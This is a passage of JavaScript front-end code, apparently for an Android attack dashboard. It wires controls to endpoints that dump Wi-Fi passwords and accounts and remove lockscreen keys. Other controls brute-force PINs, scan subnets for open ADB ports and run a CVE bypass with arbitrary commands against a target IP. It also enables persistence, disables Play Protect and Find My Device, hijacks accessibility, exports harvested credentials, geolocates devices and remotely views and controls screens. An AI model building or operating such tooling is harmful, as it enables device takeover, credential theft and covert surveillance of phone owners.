    $("#auditGrid").innerHTML = Object.entries(items).map(([k, v]) =>
      `<div class="kv-item"><div class="kv-key">${k}</div><div class="kv-val">${v}</div></div>`).join("");
  }));

  $("#pinTry").addEventListener("click", guard(null, async () => {
    const r = await API.post("/api/toolkit/unlock-pin", { pin: $("#pinIn").value });
    $("#lockResult").innerHTML = r.success
      ? `<span class="badge ok">digits dispatched</span>`
      : `<span class="badge bad">${esc(r.error || "failed")}</span>`;
  }));

  $("#gestureRm").addEventListener("click", guard(null, async () => {
    if (!confirm("Delete gesture/password keys from /data/system? Requires root.")) return;
    const r = await API.post("/api/toolkit/remove-gesture-keys");
    $("#lockResult").innerHTML = `<pre class="log-box short-log">${esc(JSON.stringify(r.operations || r, null, 2))}</pre>`;
  }));

  $("#wifiDump").addEventListener("click", guard($("#wifiDump"), async () => {
    const r = await API.get("/api/toolkit/wifi-passwords");
    $("#credList").innerHTML = listRows(
      r.wifi_networks || [],
      n => `${n.ssid || n.name || "?"} — ${n.psk || n.password || "(no psk visible)"}`,
      n => n.security || ""
    );
  }));

  $("#acctDump").addEventListener("click", guard($("#acctDump"), async () => {
    const r = await API.get("/api/toolkit/accounts");
    $("#credList").innerHTML = listRows(
      r.accounts || [],
      a => typeof a === "string" ? a : (a.name || JSON.stringify(a)),
      a => a.type || ""
    );
  }));

  $("#bloatLoad").addEventListener("click", guard($("#bloatLoad"), async () => {
    const r = await API.get("/api/toolkit/bloatware");
    $("#bloatList").innerHTML = (r.bloatware || []).map(b => {
      const pkg = b.package || b.pkg || b[0];
      const name = b.name || b[1] || pkg;
      const cat = b.category || b.reason || b[2] || "";
      return `<div class="list-row bloat-row">
        <span class="lr-main">${esc(name)}<br><span class="fsub mono">${esc(pkg)}</span></span>
        <span class="lr-sub">${esc(cat)}</span>
        <span class="row-actions-inline">
          <button class="mini-btn danger" data-bd="${esc(pkg)}">disable</button>
          <button class="mini-btn" data-br="${esc(pkg)}">restore</button>
        </span></div>`;
    }).join("") || `<div class="dim small">catalog empty</div>`;

    $$("#bloatList [data-bd]").forEach(btn => btn.addEventListener("click", guard(null, async () => {
      const r2 = await API.post("/api/toolkit/bloatware/disable", { package: btn.dataset.bd });
      r2.success ? toast(`disabled ${btn.dataset.bd}`, "ok") : toast(r2.error || r2.stdout || "failed", "err");
    })));
    $$("#bloatList [data-br]").forEach(btn => btn.addEventListener("click", guard(null, async () => {
      const r2 = await API.post("/api/toolkit/bloatware/restore", { package: btn.dataset.br });
      r2.success ? toast(`restored ${btn.dataset.br}`, "ok") : toast(r2.stdout || "failed", "err");
    })));
  }));

  $("#hwGet").addEventListener("click", guard($("#hwGet"), async () => {
    const r = await API.get("/api/toolkit/hardware");
    $("#hwOut").textContent =
      `── sensors ──\n${r.sensors || ""}\n── cameras ──\n${r.cameras || ""}\n── audio ──\n${r.audio || ""}`;
  }));

  $("#vibGo").addEventListener("click", guard(null, async () => {
    const r = await API.post("/api/toolkit/vibrate", { duration: +$("#vibDur").value || 500 });
    r.success === false ? toast(r.error || "failed", "err") : toast("buzzed", "ok");
  }));
  $("#brightGo").addEventListener("click", guard(null, async () => {
    const r = await API.post("/api/toolkit/brightness", { level: +$("#brightLvl").value || 150 });
    r.success === false ? toast(r.error || "failed", "err") : toast("brightness set", "ok");
  }));
  // record-screen is POST-only and needs the duration, so bypass the GET helpers
  $("#scrRec").addEventListener("click", guard($("#scrRec"), async () => {
    toast(`recording ${$("#scrDur").value}s…`);
    const res = await fetch("/api/toolkit/record-screen", {
      method: "POST",
      headers: { "Content-Type": "application/json", "X-API-Token": window.__DC_TOKEN },
      body: JSON.stringify({ duration: +$("#scrDur").value || 10 })
    });
    if (!res.ok) throw new Error(`${res.status} ${res.statusText}`);
    const url = URL.createObjectURL(await res.blob());
    const a = Object.assign(document.createElement("a"), { href: url, download: "screen_record.mp4" });
    document.body.appendChild(a); a.click(); a.remove();
    setTimeout(() => URL.revokeObjectURL(url), 30_000);
    toast("saved screen_record.mp4", "ok");
  }));

  $("#tweakGo").addEventListener("click", guard(null, async () => {
    const t = $("#tweakSel").value;
    if (!t) return toast("pick a tweak first", "warn");
    const r = await API.post("/api/toolkit/tweak", { tweak: t });
    r.success === false ? toast(r.error || "failed", "err") : toast(`applied: ${t}`, "ok");
  }));

  $("#fridaLoad").addEventListener("click", guard($("#fridaLoad"), async () => {
    const r = await API.get("/api/toolkit/frida-scripts");
    const scripts = r.scripts || r.items || [];
    $("#fridaList").innerHTML = listRows(
      scripts,
      s => typeof s === "string" ? s : (s.name || s.file || JSON.stringify(s)),
      s => s.description || ""
    );
  }));
}

/* ============================================================
   NETWORK / CVE LAB
   ============================================================ */

function initNetwork() {
  $("#reconRun").addEventListener("click", guard($("#reconRun"), async () => {
    const r = await API.get("/api/toolkit/wifi-recon");
    if (!r.success) throw new Error(r.error || "recon failed");
    const rec = r.recon || {};
    const arp = rec.arp_hosts || rec.arp || [];
    $("#reconOut").innerHTML = `
      <div class="kv-grid" style="margin-bottom:10px">
        <div class="kv-item"><div class="kv-key">local ip</div><div class="kv-val">${esc(rec.local_ip || rec.ip || "?")}</div></div>
        <div class="kv-item"><div class="kv-key">gateway</div><div class="kv-val">${esc(rec.gateway || "?")}</div></div>
        <div class="kv-item"><div class="kv-key">subnet</div><div class="kv-val">${esc(rec.subnet || rec.subnet_prefix || "?")}</div></div>
      </div>` +
      (Array.isArray(arp) && arp.length
        ? `<div class="scroll-list">${arp.map(h =>
            `<div class="list-row"><span class="lr-main">${esc(h.ip || h)}</span><span class="lr-sub">${esc(h.mac || h.hostname || "")}</span></div>`).join("")}</div>`
        : "");
  }));

  // prefill the subnet field from a quiet recon call
  API.get("/api/toolkit/wifi-recon").then(r => {
    const rec = r.recon || {};
    if (rec.subnet) $("#subnetIn").value = String(rec.subnet).replace(/\.\d+\/?\d*$/, "").replace(/\.0$/, "");
    else if (rec.local_ip) $("#subnetIn").value = rec.local_ip.split(".").slice(0, 3).join(".");
  }).catch(() => {});

  $("#subnetRun").addEventListener("click", guard($("#subnetRun"), async () => {
    toast("scanning…");
    const r = await API.post("/api/toolkit/subnet-scan", { subnet: $("#subnetIn").value.trim() });
    if (!r.success) throw new Error(r.error || "scan failed");
    $("#scanList").innerHTML = (r.found || []).map(d =>
      `<div class="list-row">
        <span class="lr-main">${esc(d.ip || d.host || JSON.stringify(d))}</span>
        <span class="lr-sub">${esc([d.port && `:${d.port}`, d.is_adb && "adb", d.tls_required && "tls", d.auth_required && "auth"].filter(Boolean).join(" "))}</span>
      </div>`).join("") || `<div class="dim small">nothing found (${r.count ?? 0})</div>`;
    toast(`${r.count ?? 0} hosts with open adb ports`, "ok");
  }));

  $("#cveRun").addEventListener("click", guard($("#cveRun"), async () => {
    const ip = $("#cveIp").value.trim();
    if (!ip) return toast("target ip required — lab devices you own only", "warn");
    $("#cveLog").textContent = `[*] targeting ${ip}:${$("#cvePort").value} …`;
    const t0 = Date.now();
    const r = await API.post("/api/toolkit/cve-scan", {
      ip,
      port: +$("#cvePort").value || 5555,
      key_type: $("#cveKeyType").value || null,
      cmd: $("#cveCmd").value.trim()
    });
    const secs = ((Date.now() - t0) / 1000).toFixed(1);
    $("#cveLog").textContent = (r.logs || "") +
      (r.vulnerable
        ? `\n\n── command output ──\n${r.output || "(empty)"}`
        : `\n\n[-] not exploitable / unreachable`) +
      `\n[${secs}s elapsed]`;
    toast(r.vulnerable ? `bypass succeeded via ${r.method}` : "target patched or unreachable",
          r.vulnerable ? "warn" : "ok");
  }));
}

/* ============================================================
   PERSISTENCE
   ============================================================ */

function persLog(line) {
  const el = $("#persOut");
  el.textContent += `[${nowStamp()}] ${line}\n`;
  el.scrollTop = el.scrollHeight;
}

function initPersistence() {
  $("#persEnable").addEventListener("click", guard($("#persEnable"), async () => {
    const r = await API.post("/api/exploit/enable-persistence");
    persLog(JSON.stringify(r));
    r.success === false ? toast(r.error || "failed", "err") : toast("tcp mode enabled", "ok");
  }));
  $("#persStatus").addEventListener("click", guard(null, async () => {
    const r = await API.get("/api/exploit/persistence-status");
    persLog(JSON.stringify(r));
  }));
  $("#persConnect").addEventListener("click", guard(null, async () => {
    const ip = $("#persIp").value.trim();
    if (!ip) return toast("device ip required", "warn");
    const r = await API.post("/api/exploit/connect-wifi", { ip, port: +$("#persPort").value || 5555 });
    r.success === false ? toast(r.error || "connect failed", "err") : toast(`connected ${ip}`, "ok");
    persLog(`connect ${ip}:${$("#persPort").value} → ${JSON.stringify(r)}`);
    pollStatus();
  }));
  $("#persDisconnect").addEventListener("click", guard(null, async () => {
    const r = await API.post("/api/exploit/disconnect-wifi", { ip: $("#persDiscIp").value.trim() || null });
    toast("disconnect issued", "ok");
    persLog(`disconnect → ${JSON.stringify(r)}`);
    pollStatus();
  }));
}

/* ============================================================
   WAR ROOM (TACTICAL OPERATIONS HUD)
   ============================================================ */

function initWarRoom() {
  function wrLog(s) {
    const c = $("#wrConsole");
    if (!c) return;
    c.textContent += `[${nowStamp()}] ${s}\n`;
    c.scrollTop = c.scrollHeight;
  }

  function wrSelSerial() {
    return $("#wrSerial") ? $("#wrSerial").value.trim() : "";
  }

  // devices
  async function loadWrDevices() {
    try {
      const d = await API.get("/api/device/status");
      const el = $("#wrDeviceList");
      if (!el) return;
      const list = Array.isArray(d) ? d : (d.devices || []);
      el.innerHTML = list.map(x =>
        `<span class="badge ${x.status === 'device' ? 'ok' : 'amber'}">${esc(x.serial || x.id)}</span> ${esc(x.model || "")} (${esc(x.status || x.state || "")})`
      ).join(" ") || `<span class="dim">no devices attached</span>`;
      wrLog(`devices refreshed: ${list.length} found`);
    } catch (e) {
      if ($("#wrDeviceList")) $("#wrDeviceList").textContent = "device status unreachable";
      wrLog(`devices error: ${e.message}`);
    }
  }

  $("#wrLoadDevicesBtn")?.addEventListener("click", guard($("#wrLoadDevicesBtn"), loadWrDevices));
  $("#wrClearConsoleBtn")?.addEventListener("click", () => {
    if ($("#wrConsole")) $("#wrConsole").textContent = "";
  });

  // ghost
  let sweepTargets = [];
  function renderWrTargets() {
    const tb = $("#wrTargetTable tbody");
    if (!tb) return;
    if (!sweepTargets.length) {
      tb.innerHTML = `<tr><td colspan="4" class="dim small mono">nothing on the air yet</td></tr>`;
      return;
    }
    tb.innerHTML = sweepTargets.map((t, i) => `
      <tr>
        <td class="mono">${esc(t.ip)}:${esc(t.port)}</td>
        <td><span class="badge ${t.verdict === "OPEN" ? "ok" : t.verdict === "STLS" ? "amber" : "dim"}">${esc(t.verdict)}${t.pairing_dialog_open ? " +PAIR" : ""}</span></td>
        <td class="dim small">${esc(t.source)}</td>
        <td class="right"><button class="mini-btn acc" data-wratk="${i}">⚡</button></td>
      </tr>
    `).join("");

    $$("#wrTargetTable [data-wratk]").forEach(btn => {
      btn.addEventListener("click", () => {
        const t = sweepTargets[+btn.dataset.wratk];
        if (t) {
          $("#wrAtkIp").value = t.ip;
          $("#wrAtkPort").value = t.port;
          toast(`selected ${t.ip}:${t.port}`, "ok", 1500);
        }
      });
    });
  }

  $("#wrSweepBtn")?.addEventListener("click", guard($("#wrSweepBtn"), async () => {
    wrLog("ghost sweep started — listening…");
    toast("scanning mDNS + TCP subnets…");
    const d = await API.get("/api/ghost/sweep?window=8&subnet=1");
    sweepTargets = d.targets || [];
    renderWrTargets();
    wrLog(`sweep finished: ${sweepTargets.length} targets found`);
    if ((d.pairing_services || []).length) {
      wrLog(`⚠ PAIRING DIALOG OPEN: ${JSON.stringify(d.pairing_services)}`);
      toast("pairing dialog detected on air!", "warn");
    }
  }));

  $("#wrRadioBtn")?.addEventListener("click", guard($("#wrRadioBtn"), async () => {
    const d = await API.get("/api/ghost/radio");
    const hot = d.hotspot_candidates || [];
    wrLog(`radio scan: ${d.networks?.length || 0} networks, ${hot.length} hotspot candidates`);
    hot.slice(0, 6).forEach(n => wrLog(`  📶 ${n.ssid} [${n.hotspot_family}] conf ${n.confidence} auth ${n.auth}`));
    toast(`${hot.length} hotspot candidates found`, "ok");
  }));

  $("#wrAttackBtn")?.addEventListener("click", guard($("#wrAttackBtn"), async () => {
    const ip = $("#wrAtkIp").value.trim();
    const port = $("#wrAtkPort").value.trim();
    if (!ip) return toast("target ip required", "warn");
    wrLog(`attack targeting ${ip}:${port}…`);
    const d = await API.post("/api/ghost/attack", { ip, port });
    wrLog(`attack ${ip}:${port} vector=${d.vector || "?"} success=${d.success}`);
    if (d.proof?.output) wrLog(`proof>> ${String(d.proof.output).slice(0, 220).replace(/\n/g, " | ")}`);
    if (d.log) d.log.forEach(l => wrLog(`  ${l}`));
    if (d.error) wrLog(`err: ${d.error}`);
    toast(d.success ? "attack vector succeeded!" : "attack finished", d.success ? "ok" : "err");
  }));

  $("#wrJoinBtn")?.addEventListener("click", guard($("#wrJoinBtn"), async () => {
    const ssid = $("#wrJoinSsid").value.trim();
    const pw = $("#wrJoinPw").value;
    if (!ssid) return toast("SSID required", "warn");
    const d = await API.post("/api/ghost/join", { ssid, password: pw });
    wrLog(d.success ? `joined ${ssid}, gateway ${d.gateway_ip}` : `join failed: ${d.error}`);
    toast(d.success ? `connected to ${ssid}` : "join failed", d.success ? "ok" : "err");
  }));

  // skeleton
  async function refreshWrSnaps() {
    try {
      const d = await API.get("/api/skeleton/snapshots");
      const sel = $("#wrSnapSel");
      if (sel) {
        sel.innerHTML = (d.snapshots || []).map(f => `<option value="${esc(f)}">${esc(f)}</option>`).join("")
          || `<option value="">no snapshots</option>`;
      }
    } catch (_) {}
  }

  $("#wrSnapshotBtn")?.addEventListener("click", guard($("#wrSnapshotBtn"), async () => {
    const d = await API.post("/api/skeleton/snapshot", {});
    $("#wrSkelOut").textContent = `snapshot → ${d.snapshot_file}`;
    wrLog(`snapshot saved: ${d.snapshot_file}`);
    toast("snapshot captured", "ok");
    refreshWrSnaps();
  }));

  $("#wrNeutralizeBtn")?.addEventListener("click", guard($("#wrNeutralizeBtn"), async () => {
    const actions = [];
    if ($("#wr_a_verifier").checked) actions.push("kill_play_protect");
    if ($("#wr_a_fmd").checked) actions.push("kill_find_my_device");
    if ($("#wr_a_acc").checked) actions.push("hijack_accessibility");
    const body = { actions };
    if (actions.includes("hijack_accessibility")) {
      const comp = prompt("Accessibility component (full path):", "com.lo.syskit/.AuditService");
      if (comp === null) return;
      body.accessibility_component = comp;
    }
    wrLog(`neutralize starting: ${actions.join(", ")}`);
    const d = await API.post("/api/skeleton/neutralize", body);
    const fails = [];
    Object.entries(d.results || {}).forEach(([k, v]) => {
      v.forEach(s => { if (!s.success) fails.push(`${k}: ${s.note || s.error || "failed"}`); });
    });
    $("#wrSkelOut").innerHTML = `neutralize → ${d.success ? '<b style="color:var(--emerald-hi)">CLEAN BOARD</b>' : '<b style="color:var(--ruby-hi)">PARTIAL</b>'}`
      + (fails.length ? `<br>${fails.join("<br>")}` : "");
    wrLog(`neutralize completed (success=${d.success})`);
    toast(d.success ? "protections neutralized" : "neutralize completed with warnings", d.success ? "ok" : "warn");
  }));

  $("#wrRestoreBtn")?.addEventListener("click", guard($("#wrRestoreBtn"), async () => {
    const f = $("#wrSnapSel").value;
    if (!f) return toast("no snapshot selected", "warn");
    const d = await API.post("/api/skeleton/restore", { snapshot_file: f });
    $("#wrSkelOut").textContent = `restored from ${f}: ${d.success}`;
    wrLog(`restore ${f}: ${d.success}`);
    toast(`restored from ${f}`, "ok");
  }));

  $("#wrPostureBtn")?.addEventListener("click", guard($("#wrPostureBtn"), async () => {
    const d = await API.get("/api/skeleton/creds/posture");
    $("#wrSkelOut").innerHTML = Object.entries(d.posture || {})
      .map(([k, v]) => `<div class="kv"><span>${esc(k)}</span><b>${esc(v || "—")}</b></div>`).join("");
    wrLog("posture readout fetched");
  }));

  $("#wrHarvestBtn")?.addEventListener("click", () => {
    window.open("/api/skeleton/creds/export", "_blank");
  });

  // pin siege
  let wrSiegeTimer = null;
  async function pollWrSiege() {
    try {
      const s = await API.get("/api/siege/status");
      $("#wrSgAtt").textContent = s.attempts ?? 0;
      $("#wrSgLock").textContent = s.lockouts_hit ?? 0;
      $("#wrSgWait").textContent = s.waiting_seconds_left ?? 0;
      $("#wrSiegeLog").textContent = (s.log || []).slice(-8).join("\n");
      if (!s.running && s.finished_at) {
        clearInterval(wrSiegeTimer);
        wrSiegeTimer = null;
        $("#wrSiegeDot").textContent = s.unlocked ? "UNLOCKED ✅" : "CLOSED";
        $("#wrSiegeDot").className = `badge ${s.unlocked ? "ok" : "dim"}`;
        if (s.unlocked) {
          wrLog("*** KEYGUARD DOWN — UNLOCKED ***");
          toast("Keyguard successfully unlocked!", "ok", 8000);
        }
      }
    } catch (_) {}
  }

  $("#wrSiegeStartBtn")?.addEventListener("click", guard($("#wrSiegeStartBtn"), async () => {
    const preset = $("#wrSiegePreset").value;
    const codes = ($("#wrSiegeCodes").value || "").split(",").map(s => s.trim()).filter(Boolean);
    const d = await API.post("/api/siege/start", {
      serial: wrSelSerial(), preset, codes, max_attempts: 3000
    });
    if (!d.success) {
      wrLog(`siege start failed: ${d.error}`);
      return toast(d.error || "siege start failed", "err");
    }
    wrLog(`SIEGE OPEN — ${preset}`);
    $("#wrSiegeDot").textContent = "RUNNING";
    $("#wrSiegeDot").className = "badge amber";
    clearInterval(wrSiegeTimer);
    wrSiegeTimer = setInterval(pollWrSiege, 1200);
    toast(`PIN siege launched (${preset})`, "warn");
  }));

  $("#wrSiegeStopBtn")?.addEventListener("click", guard($("#wrSiegeStopBtn"), async () => {
    await API.post("/api/siege/stop", {});
    clearInterval(wrSiegeTimer);
    wrSiegeTimer = null;
    $("#wrSiegeDot").textContent = "ABORTED";
    $("#wrSiegeDot").className = "badge dim";
    wrLog("PIN siege aborted by operator");
    toast("PIN siege stopped", "ok");
  }));

  // geo
  $("#wrGeoSnapBtn")?.addEventListener("click", guard($("#wrGeoSnapBtn"), async () => {
    const d = await API.get("/api/geo/snapshot?serial=" + encodeURIComponent(wrSelSerial()));
    $("#wrWigState").textContent = d.wigle_enabled ? "ON" : "off";
    const est = d.estimate
      ? `<div class="kv"><span>ESTIMATE</span><b>${d.estimate.lat}, ${d.estimate.lon} ±room</b></div>` : "";
    $("#wrGeoOut").innerHTML = est
      + `<div class="kv"><span>Wi-Fi APs Heard</span><b>${d.wifi?.count ?? 0}</b></div>`
      + `<div class="kv"><span>Top AP</span><b>${esc(d.wifi?.aps?.[0]?.bssid || "—")} (${d.wifi?.aps?.[0]?.rssi_dbm ?? ""}dBm)</b></div>`
      + `<div class="kv"><span>Cell Operator</span><b>${esc(d.cell?.props?.["gsm.operator.alpha"] || "—")}</b></div>`
      + `<div class="kv"><span>Cells Registered</span><b>${d.cell?.cells?.length ?? 0}</b></div>`
      + (d.gps_last_known ? `<div class="kv"><span>Last Known GPS</span><b>${d.gps_last_known.lat}, ${d.gps_last_known.lon}</b></div>` : "");
    wrLog(`geo RF snapshot captured (${d.wifi?.count ?? 0} APs)`);
    toast("Geo RF snapshot captured", "ok");
  }));

  // live screen console
  let wrLiveTimer = null;
  function refreshWrFrame() {
    const img = $("#wrScreenImg");
    if (!img) return;
    img.src = "/api/screen/frame?serial=" + encodeURIComponent(wrSelSerial()) + "&t=" + Date.now();
  }

  function toggleWrLive() {
    const btn = $("#wrLiveBtn");
    if (wrLiveTimer) {
      clearInterval(wrLiveTimer);
      wrLiveTimer = null;
      if (btn) {
        btn.textContent = "▶ Stream Live";
        btn.classList.remove("danger");
        btn.classList.add("acc");
      }
      wrLog("live stream paused");
      return;
    }
    const ms = parseInt($("#wrFpsSel")?.value) || 1000;
    wrLiveTimer = setInterval(refreshWrFrame, ms);
    if (btn) {
      btn.textContent = "■ Stop Stream";
      btn.classList.remove("acc");
      btn.classList.add("danger");
    }
    refreshWrFrame();
    wrLog(`live stream active (${(1000/ms).toFixed(1)} FPS)`);
  }

  $("#wrLiveBtn")?.addEventListener("click", toggleWrLive);

  // touch & swipe gestures on warroom screen
  (function initWrGestures() {
    const img = $("#wrScreenImg");
    if (!img) return;
    let dragStart = null;
    let devW = null, devH = null;

    async function ensureDevDims() {
      if (devW) return;
      try {
        const d = await API.get("/api/screen/size?serial=" + encodeURIComponent(wrSelSerial()));
        const m = /(\d+)x(\d+)/.exec(d.output || "");
        if (m) { devW = +m[1]; devH = +m[2]; }
      } catch (_) {}
      devW = devW || 1080; devH = devH || 2400;
    }

    img.addEventListener("dragstart", e => e.preventDefault());
    img.addEventListener("pointerdown", e => {
      const r = img.getBoundingClientRect();
      dragStart = [e.clientX - r.left, e.clientY - r.top];
    });

    img.addEventListener("pointerup", async e => {
      if (!dragStart) return;
      const r = img.getBoundingClientRect();
      const end = [e.clientX - r.left, e.clientY - r.top];
      const dist = Math.hypot(end[0] - dragStart[0], end[1] - dragStart[1]);
      const view = { w: r.width, h: r.height };
      await ensureDevDims();
      const nx = (devW || 1080) / view.w;
      const ny = (devH || 2400) / view.h;

      if (dist < 12) {
        const dx = Math.round(dragStart[0] * nx);
        const dy = Math.round(dragStart[1] * ny);
        await API.post("/api/screen/tap", { serial: wrSelSerial(), x: dx, y: dy });
        wrLog(`tap [${dx}, ${dy}]`);
      } else {
        await API.post("/api/screen/swipe", {
          serial: wrSelSerial(),
          points: [dragStart, end],
          view,
          ms: (parseInt($("#wrFpsSel")?.value) || 1000) / 2
        });
        wrLog(`swipe gesture`);
      }
      setTimeout(refreshWrFrame, 350);
      dragStart = null;
    });
  })();

  $("#wrSendTextBtn")?.addEventListener("click", guard($("#wrSendTextBtn"), async () => {
    const text = $("#wrTypeText").value;
    if (!text) return toast("enter text first", "warn");
    await API.post("/api/screen/text", { serial: wrSelSerial(), text });
    $("#wrTypeText").value = "";
    refreshWrFrame();
    wrLog(`sent text: "${text}"`);
    toast("text keystrokes injected", "ok");
  }));

  // auto-load target devices & snapshots on tab open
  loadWrDevices();
  refreshWrSnaps();
  wrLog("WAR ROOM armed. Unified tactical HUD loaded.");
}

/* ============================================================
   BOOT
   ============================================================ */

document.addEventListener("DOMContentLoaded", () => {
  pollStatus();
  goto("dashboard");
});
